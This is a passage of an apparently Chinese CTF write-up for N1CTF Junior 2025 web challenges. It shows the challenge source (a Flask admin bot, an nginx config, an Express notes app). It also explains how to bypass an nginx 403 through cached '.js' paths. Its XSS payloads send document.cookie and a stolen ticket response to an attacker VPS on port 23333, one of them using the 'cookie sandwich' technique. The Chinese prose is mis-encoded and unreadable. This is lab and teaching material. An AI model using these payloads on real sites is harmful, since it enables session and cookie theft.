punctuation">[</span><span class="token string">"--no-sandbox"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            context <span class="token operator">=</span> browser<span class="token punctuation">.</span>new_context<span class="token punctuation">(</span><span class="token punctuation">)</span>            context<span class="token punctuation">.</span>add_cookies<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span>                <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'flag'</span><span class="token punctuation">,</span>                <span class="token string">'value'</span><span class="token punctuation">:</span> flag_value<span class="token punctuation">,</span>                <span class="token string">'domain'</span><span class="token punctuation">:</span> <span class="token string">'localhost'</span><span class="token punctuation">,</span>                <span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span>                <span class="token string">'httponly'</span><span class="token punctuation">:</span> <span class="token boolean">True</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            page <span class="token operator">=</span> context<span class="token punctuation">.</span>new_page<span class="token punctuation">(</span><span class="token punctuation">)</span>            page<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token string">"http://localhost/login"</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span>            page<span class="token punctuation">.</span>fill<span class="token punctuation">(</span><span class="token string">"input[name='username']"</span><span class="token punctuation">,</span> <span class="token string">"admin"</span><span class="token punctuation">)</span>            page<span class="token punctuation">.</span>fill<span class="token punctuation">(</span><span class="token string">"input[name='password']"</span><span class="token punctuation">,</span> admin_password<span class="token punctuation">)</span>            page<span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token string">"input[name='submit']"</span><span class="token punctuation">)</span>            page<span class="token punctuation">.</span>wait_for_timeout<span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span>            page<span class="token punctuation">.</span>goto<span class="token punctuation">(</span>url<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span>            page<span class="token punctuation">.</span>wait_for_timeout<span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span>            browser<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Bot error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>nginx.conf</p><pre class="line-numbers language-conf" data-language="conf"><code class="language-conf">user  www-data;worker_processes  auto;pid        &#x2F;var&#x2F;run&#x2F;nginx.pid;events &#123;    worker_connections  1024;&#125;http &#123;    proxy_cache_path &#x2F;var&#x2F;cache&#x2F;nginx levels&#x3D;1:2 keys_zone&#x3D;static_cache:10m max_size&#x3D;1g inactive&#x3D;60m;    include       &#x2F;etc&#x2F;nginx&#x2F;mime.types;    default_type  application&#x2F;octet-stream;    server &#123;        listen 80 default_server;        server_name _;        location &#x2F; &#123;            proxy_pass http:&#x2F;&#x2F;127.0.0.1:5000;        &#125;        location &#x2F;api&#x2F;bio&#x2F; &#123;            return 403;        &#125;        location ~ \.(css|js)$ &#123;            proxy_pass http:&#x2F;&#x2F;127.0.0.1:5000;            proxy_ignore_headers Vary;            proxy_cache static_cache;            proxy_cache_valid 200 10m;        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœæ²¡æœ‰ 403 é™åˆ¶çš„è¯ï¼Œè®¿é—® &#x2F;api&#x2F;bio&#x2F;username ä¼šè¿”å› user.bioï¼Œbio æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œå¯ä»¥ xss</p><p>ä½†æ˜¯</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/api/bio/&lt;string:username>"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_required</span><span class="token keyword">def</span> <span class="token function">get_user_bio</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> current_user<span class="token punctuation">.</span>username <span class="token operator">==</span> username<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Unauthorized"</span><span class="token punctuation">,</span> <span class="token number">401</span>    user <span class="token operator">=</span> USERS_DB<span class="token punctuation">.</span>get<span class="token punctuation">(</span>username<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> user<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"User not found."</span><span class="token punctuation">,</span> <span class="token number">404</span>    <span class="token keyword">return</span> user<span class="token punctuation">.</span>bio<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æµ‹è¯•å‘ç°è¿œç¨‹ç¯å¢ƒçš„ key ä¹Ÿæ˜¯ <code>your-secret-key-here</code>ï¼Œé‚£ä¹ˆå¯ä»¥ç™»å½•åˆ° admin</p><p>å¦ä¸€ä¸ªé—®é¢˜æ˜¯ <code>visit_url(f&quot;http://localhost/api/bio/&#123;username&#125;&quot;)</code> ç›´æ¥èµ°çš„ nginx ä¸€å®šä¼šè¢« 403 æ‹¦ä¸‹æ¥</p><p>è§‚å¯Ÿè¿™é‡Œ</p><pre class="line-numbers language-conf" data-language="conf"><code class="language-conf">location ~ \.(css|js)$ &#123;    proxy_pass http:&#x2F;&#x2F;127.0.0.1:5000;    proxy_ignore_headers Vary;    proxy_cache static_cache;    proxy_cache_valid 200 10m;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>.css/.js</code> ç»“å°¾çš„ä¸å—é™åˆ¶èƒ½å¤Ÿæ­£å¸¸ä»£ç†åˆ° 5000 ç«¯å£ä¸Šï¼Œå¹¶ä¸”å­˜åœ¨ç¼“å­˜ï¼Œå¯ä»¥ç»•è¿‡ 403</p><p>è¿™æ ·æˆ‘ä»¬æ³¨å†Œä¸€ä¸ª 1.jsï¼Œç„¶åä¿®æ”¹ bio å°±èƒ½å®ç° xss äº†</p><h2 id="éé¢„æœŸ-1"><a href="#éé¢„æœŸ-1" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">context<span class="token punctuation">.</span>add_cookies<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span>    <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'flag'</span><span class="token punctuation">,</span>    <span class="token string">'value'</span><span class="token punctuation">:</span> flag_value<span class="token punctuation">,</span>    <span class="token string">'domain'</span><span class="token punctuation">:</span> <span class="token string">'localhost'</span><span class="token punctuation">,</span>    <span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span>    <span class="token string">'httponly'</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å› ä¸º httpOnly æ‹¼é”™äº†å¯¼è‡´ä¸ç”Ÿæ•ˆï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥æŠŠ cookie x å‡ºæ¥</p><p>ä¿®æ”¹ 1.js çš„ bio ä¸º payloadï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'http://vps:23333/'</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åè®¿é—® &#x2F;view è®© bot è®¿é—® &#x2F;api&#x2F;bio&#x2F;1.js å³å¯ï¼Œæ³¨æ„ç¼“å­˜æ—¶é—´ä¸º 10 åˆ†é’Ÿ</p><p><img src="/blog/2025/09/13/N1CTF-Junior-2025-2-2/IMG-20250917145724173.png"></p><h2 id="é¢„æœŸ-1"><a href="#é¢„æœŸ-1" class="headerlink" title="é¢„æœŸ"></a>é¢„æœŸ</h2><p>å‚è€ƒï¼š<a href="https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique">https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique</a></p><p>å› ä¸ºè¿™é‡Œ ticket å¯æ§ä¸”ä¼šè¿”å›åˆ°å“åº”ä½“ cookieï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨ <code>cookie sandwich technique</code>ï¼Œç»“åˆæœåŠ¡å™¨çš„å›æ˜¾ï¼Œæ”»å‡» HttpOnly çš„ cookie</p><p>expï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://localhost/ticket"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">$Version=1; domain=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>url<span class="token punctuation">.</span>hostname<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">; path=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>url<span class="token punctuation">.</span>pathname<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">ticket="test; domain=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>url<span class="token punctuation">.</span>hostname<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">; path=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>url<span class="token punctuation">.</span>pathname<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">aaa=bbb"; domain=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>url<span class="token punctuation">.</span>hostname<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">; path=/;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"/ticket"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">credentials</span><span class="token operator">:</span> <span class="token string">'include'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> response<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"http://vps:23333/"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>                <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>                <span class="token literal-property property">body</span><span class="token operator">:</span> data<span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/09/13/N1CTF-Junior-2025-2-2/IMG-20250917150913104.png"></p><hr><h1 id="safenotesï¼ˆå¤ç°ï¼‰"><a href="#safenotesï¼ˆå¤ç°ï¼‰" class="headerlink" title="safenotesï¼ˆå¤ç°ï¼‰"></a>safenotesï¼ˆå¤ç°ï¼‰</h1><p>è¿˜åœ¨ x è¿˜åœ¨ x</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"express"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"body-parser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"crypto"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> bot <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"./bot"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">PORT</span> <span class="token operator">=</span> <span class="token number">3000</span><span class="token punctuation">;</span><span class="token keyword">let</span> notes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">escapeHTML</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> str        <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&amp;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">"&amp;amp;"</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&lt;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">"&amp;lt;"</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">></span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">"&amp;gt;"</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">"</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">"&amp;quot;"</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">'</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">"&amp;#39;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> nonce <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>nonce<span class="token operator">=</span>nonce<span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Content-Security-Policy"</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">        default-src 'none';        script-src 'nonce-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>nonce<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">';        style-src 'unsafe-inline';    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\n</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> listItems <span class="token operator">=</span> notes<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">content<span class="token punctuation">,</span> index</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">        &lt;li style="margin-bottom:15px;padding:10px;border:1px solid #ddd;border-radius:5px;background:#f9f9f9;">            &lt;a href="/note/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>index<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">">Note </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>index<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/a>            &lt;div id='note-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>index<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">' class="note-content">&lt;/div>            &lt;form action="/delete/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>index<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">" method="POST" style="display:inline;">                &lt;button type="submit" style="margin-left:10px;background:#ff4d4f;color:white;border:none;border-radius:3px;cursor:pointer;">Delete&lt;/button>            &lt;/form>            &lt;script src="/preview?index=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&amp;content=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">" nonce="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>res<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>nonce<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">">&lt;/script>        &lt;/li>        </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">    &lt;html>    &lt;head>        &lt;title>ğŸ“’ Notes&lt;/title>        &lt;style>            body &#123; font-family: Arial, sans-serif; margin: 40px; &#125;            textarea &#123; width: 400px; height: 80px; &#125;            button &#123; margin-top: 5px; &#125;            ul &#123; list-style: none; padding: 0; &#125;        &lt;/style>    &lt;/head>    &lt;body>        &lt;h1>ğŸ“’ Notes&lt;/h1>        &lt;form action="/add" method="POST">            &lt;textarea name="content">&lt;/textarea>&lt;br>            &lt;button type="submit">Add Note&lt;/button>        &lt;/form>        &lt;hr>        &lt;ul>            </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>listItems<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">        &lt;/ul>    &lt;/body>    &lt;/html>    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/preview"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/javascript"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> index <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>index<span class="token punctuation">;</span>    <span class="token keyword">let</span> content <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>content <span class="token operator">||</span> <span class="token string">""</span><span class="token punctuation">;</span>    content<span class="token operator">=</span><span class="token function">escapeHTML</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> js <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">    (function()&#123;        const el = document.getElementById('note-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>index<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">');        if (!el) return;        const text = '</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>content<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">';        if (text.length > 50) &#123;            el.innerHTML = text.slice(0,50) + '...';        &#125; else &#123;            el.innerHTML = text;        &#125;    &#125;)();    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>js<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/add"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> content <span class="token operator">=</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>content <span class="token operator">||</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>content<span class="token punctuation">)</span> notes<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/note/:id"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> id <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>id <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> id <span class="token operator">&lt;</span> notes<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">            &lt;h1>Note </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>id<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/h1>            &lt;p></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>notes<span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/p>            &lt;a href="/">Back&lt;/a>            &lt;form action="/delete/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>id<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">" method="POST">                &lt;button type="submit">Delete this note&lt;/button>            &lt;/form>        </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Note not found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/delete/:id"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> 